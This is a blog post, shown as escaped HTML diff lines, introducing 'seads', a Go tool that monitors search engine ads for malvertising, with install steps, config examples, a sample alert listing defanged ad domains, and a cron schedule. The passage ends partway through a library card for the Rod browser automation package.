+&lt;p&gt;The idea for &lt;code&gt;seads&lt;/code&gt; came from the growing number of cases of malicious ads displayed in search engine results and my need for a tool to detect them automatically. Recently, various incidents show how malvertising has been used for redirecting users to &lt;a href="https://www.malwarebytes.com/blog/threat-intelligence/2023/05/malvertising-its-a-jungle-out-there" target="_blank" rel="noreferrer"&gt;phishing websites&lt;/a&gt; and for &lt;a href="https://securelist.com/malvertising-through-search-engines/108996/" target="_blank" rel="noreferrer"&gt;malware distribution&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Malvertising is a particularly sneaky technique, as it exploits the trust users place in the top search results of by their favorite search engines. A suggestion: to increase your online safety, consider installing tools like &lt;a href="https://ublockorigin.com/" target="_blank" rel="noreferrer"&gt;uBlock Origin&lt;/a&gt; or other reputable ad-blockers. These tools can help mitigate the risks associated with malvertising by blocking potentially harmful ads :)&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Introducing &lt;code&gt;seads&lt;/code&gt;
+&lt;div id="introducing-seads" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#introducing-seads" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;seads&lt;/code&gt; is written in Go and it uses headless browser pages to navigate to popular search engines, where it retrieves a list of ads displayed in response to user-submitted queries. At the time of this blog post, &lt;code&gt;seads&lt;/code&gt; is able to detect ads on Google, Bing, DuckDuckGo, and Yahoo.&lt;/p&gt;
+&lt;p&gt;In addition, &lt;code&gt;seads&lt;/code&gt; can notify about detected ads via email, Slack or Telegram, it can provide a screenshot to support the evidence of malvertising campaigns, and can be executed using Docker.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Getting started
+&lt;div id="getting-started" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#getting-started" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;You can download the binary from the &lt;a href="https://github.com/andpalmier/seads/releases" target="_blank" rel="noreferrer"&gt;releases section on Github&lt;/a&gt; or compile it from source using the following Go installation command:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;go install github.com/andpalmier/seads/cmd/seads@latest&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Alternatively, you can use Docker to run &lt;code&gt;seads&lt;/code&gt; without affecting your local setup:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;docker build -t seads .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;docker run -v &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;:/mnt seads -h&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Once installed, you need to create a config file, here is an example that you can adjust to your needs:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-yaml" data-lang="yaml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;queries&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="nt"&gt;query&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;apple&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;expected-domains&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="l"&gt;apple.com, amazon.com]&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="nt"&gt;query&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;as roma&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;expected-domains&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The config file above will query &amp;ldquo;ipad&amp;rdquo; and &amp;ldquo;as roma&amp;rdquo; in search engines, the field &amp;ldquo;expected-domains&amp;rdquo; is used to specify domains we are expecting to appear in the ads of search engines while searching for the specified keywords. Domains in &amp;ldquo;expected-domains&amp;rdquo; will still appear in the output of &lt;code&gt;seads&lt;/code&gt;, but won&amp;rsquo;t be sent in the notification.&lt;/p&gt;
+&lt;p&gt;Finally, &lt;code&gt;seads&lt;/code&gt; can be executed with the following flags:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -config string &lt;span class="o"&gt;(&lt;/span&gt;REQUIRED&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; path to config file &lt;span class="o"&gt;(&lt;/span&gt;default &lt;span class="s2"&gt;&amp;#34;config.yaml&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -concurrency int
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; number of concurrent headless browsers &lt;span class="o"&gt;(&lt;/span&gt;default 4&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -cleanlinks
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; print clear links in output &lt;span class="o"&gt;(&lt;/span&gt;links will remain defanged in notifications&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -notify
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; notify &lt;span class="k"&gt;if&lt;/span&gt; unexpected domains are found.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -screenshot string
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; path to store screenshots &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; empty, the screenshot feature will be disabled&lt;span class="o"&gt;)&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In order to receive notifications via email, Slack, or Telegram, you need to configure the &lt;code&gt;config.yaml&lt;/code&gt; file with your credentials and preferences:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-yaml" data-lang="yaml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;host&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;SMTP server hostname or IP address (string)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;port&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;SMTP server port, common ones are 25, 465, 587 or 2525 (int)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;SMTP server username (string)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;SMTP server password (string)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;from&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;E-mail address that the mail are sent from (string)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;recipients&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;List of recipient e-mails (list of strings)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;slack&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;token&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;API Bot token (string)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;channels&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;Channels to send messages to in Cxxxxxxxxxx format(list of strings)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;telegram&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;token&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;API Bot token (string)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;chatid&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;Chat IDs or Channel names (list of strings)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 class="relative group"&gt;Testing it
+&lt;div id="testing-it" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#testing-it" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;Here is a real-life example of detecting ads with &lt;code&gt;seads&lt;/code&gt; using the config file pasted above. The tool is executed with:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;seads -config config.yaml -screenshot scr -notify&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and it produces the following output:&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="/images/posts/seads/seads.gif" alt="seads output" /&gt;
+&lt;figcaption&gt;Output recorded with &lt;a href="https://asciinema.org/" target="_blank" rel="noreferrer"&gt;asciinema&lt;/a&gt;&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;If ads were found, a new folder &lt;code&gt;src&lt;/code&gt; will be created, containing screenshots like the one below:&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="/images/posts/seads/example-yahoo-apple.webp" alt="seads screenshot" /&gt;
+&lt;figcaption&gt;One of the screenshot produced by &lt;code&gt;seads&lt;/code&gt;&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;A screenshot will be taken only if at least one ad is detected, ensuring that screenshots are relevant. Screenshots are named following this format: &lt;code&gt;searchengine-query-timestamp.png&lt;/code&gt;. For example, the screenshot above will be named &lt;code&gt;yahoo-apple-1710278888941790000.png&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;And here is the notification which will be sent to the specified channels:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Here are the &amp;#34;unexpected domains&amp;#34; found during the last execution of seads:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Message creation date: 2024-03-12 22:28:14
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;* Search engine: Yahoo
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Search term: apple
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Domain: reparaturpc[.]ch
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Full link: www[.]https://reparaturpc[.]ch/de/?msclkid=75c3ce8f8942156ac179ab7f41a03704
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;* Search engine: Yahoo
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Search term: apple
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Domain: fust[.]ch
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Full link: https://www[.]fust[.]ch/de/marken/apple[.]html?&amp;amp;msclkid=a836011a07061ba4052864eacfe7d0fd&amp;amp;utm_source=bing&amp;amp;utm_medium=cpc&amp;amp;utm_campaign=Bing%20-%20NBrand%20-%20S%20-%20D%20-%20MM%20PC%20Marke%20Apple&amp;amp;utm_term=apple&amp;amp;utm_content=1_Apple%3D2_undefined%C2%A63_Nbrand&amp;amp;gclid=a836011a07061ba4052864eacfe7d0fd&amp;amp;gclsrc=3p[.]ds
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;* Search engine: Yahoo
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Search term: apple
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Domain: jobs[.]ch
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Full link: https://www[.]jobs[.]ch/en/vacancies/?term=apple&amp;amp;utm_source=bing&amp;amp;utm_medium=search&amp;amp;utm_campaign=wb:jobs|tg:b2c|cn:ww|lg:en|ct:search,nonbrand,company|cd:company|mg:job-application|pd:y|tt:cpc|gt:keyword,nonbrand,company|gd:company&amp;amp;msclkid=17ac4d7d0b0616628f40288dc3e79a46&amp;amp;utm_term=apple&amp;amp;utm_content=gt%3Akeyword,nonbrand,company%7Cgd%3Acompany
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;* Search engine: Yahoo
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Search term: apple
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Domain: amazon[.]com
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Full link: https://www[.]amazon[.]com/s?k=applwe&amp;amp;adgrpid=1344703557775981&amp;amp;hvadid=84044278562817&amp;amp;hvbmt=be&amp;amp;hvdev=c&amp;amp;hvlocphy=3322&amp;amp;hvnetw=o&amp;amp;hvqmt=e&amp;amp;hvtargid=kwd-84044521042995%3Aloc-175&amp;amp;hydadcr=29387_14610683&amp;amp;tag=mh0b-20&amp;amp;ref=pd_sl_7xha1yy51_e
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;This message was automatically sent by seads (www.github.com/andpalmier/seads)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 class="relative group"&gt;Automating executions
+&lt;div id="automating-executions" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#automating-executions" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;
+&lt;p&gt;It is possible to further leverage the notification feature by automating execution of &lt;code&gt;seads&lt;/code&gt;. In Linux, we can use &lt;code&gt;cron&lt;/code&gt; to do it, for example, to run &lt;code&gt;seads&lt;/code&gt; daily at 9:00 AM, you can add the following entry to your crontab:&lt;/p&gt;
+&lt;div class="highlight-wrapper"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;9&lt;/span&gt; * * * /path/to/seads -config /path/to/config.yaml -screenshot /path/to/screenshots -notify&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;For Windows and macOS users, similar scheduling options are available using Task Scheduler and &lt;code&gt;launchd&lt;/code&gt;, respectively.&lt;/p&gt;
+&lt;p&gt;By setting up a well-configured file, we can automate the execution of &lt;code&gt;seads&lt;/code&gt; and receive notifications whenever it detects an ad from an unexpected domain. For instance, if we&amp;rsquo;re interested in potential malvertising targeting our company, we simply list our company&amp;rsquo;s domains in the expected-domains field. This way, &lt;code&gt;seads&lt;/code&gt; will continuously monitor for any ads that don&amp;rsquo;t match our specified domains, alerting us immediately if it finds any.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Libraries used
+&lt;div id="libraries-used" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#libraries-used" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;
+&lt;p&gt;For automating the headless browser, I relied on Rod, a powerful library that works with the DevTools Protocol. Rod is very popular for tasks like web scraping and automation, and it is capable of mimicking manual interactions with the browser. You can find additional information about Rod on its &lt;a href="https://go-rod.github.io/" target="_blank" rel="noreferrer"&gt;documentation site&lt;/a&gt; and GitHub repository:&lt;/p&gt;
+&lt;div class="github-card-wrapper"&gt;
+&lt;a id="github-836ee50f67fe81c4996660a3198d3e36" target="_blank" href="https://github.com/go-rod/rod" class="cursor-pointer"&gt;
+&lt;div
+class="w-full md:w-auto p-0 m-0 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl"&gt;&lt;div class="w-full nozoom"&gt;
+&lt;img
+src="https://opengraph.githubassets.com/0/go-rod/rod"
+alt="GitHub Repository Thumbnail"
+class="nozoom mt-0 mb-0 w-full h-full object-cover"&gt;
+&lt;/div&gt;&lt;div class="w-full md:w-auto pt-3 p-5"&gt;
+&lt;div class="flex items-center"&gt;
+&lt;span class="text-2xl text-neutral-800 dark:text-neutral me-2"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"&gt;&lt;path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/&gt;&lt;/svg&gt;
+&lt;/span&gt;
+&lt;/span&gt;
+&lt;div
+id="github-836ee50f67fe81c4996660a3198d3e36-full_name"
+class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"&gt;
+go-rod/rod
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p id="github-836ee50f67fe81c4996660a3198d3e36-description" class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral"&gt;
+A Chrome DevTools Protocol driver for web automation and scraping.
+&lt;/p&gt;
+&lt;div class="m-0 mt-2 flex items-center"&gt;
+&lt;span class="mr-1 inline-block h-3 w-3 rounded-full language-dot" data-language="Go"&gt;&lt;/span&gt;
+&lt;div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+Go
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
+&lt;span class="relative block icon"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"&gt;&lt;path fill="currentColor" d="M287.9 0C297.1 0 305.5 5.25 309.5 13.52L378.1 154.8L531.4 177.5C540.4 178.8 547.8 185.1 550.7 193.7C553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4L459.9 483.9C461.4 492.9 457.7 502.1 450.2 507.4C442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9L150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4C118.2 502.1 114.5 492.9 115.1 483.9L142.2 328.4L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7C28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8L266.3 13.52C270.4 5.249 278.7 0 287.9 0L287.9 0zM287.9 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9L184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7L276.6 387.5C283.7 383.7 292.2 383.7 299.2 387.5L404.4 443.7L384.2 324.1C382.9 316.4 385.5 308.5 391 303L476.9 217.9L358.6 200.5C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/&gt;&lt;/svg&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;div id="github-836ee50f67fe81c4996660a3198d3e36-stargazers" class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral"&gt;
+6583
+&lt;/div&gt;
+&lt;span class="text-md mr-1 text-neutral-800 dark:text-neutral"&gt;
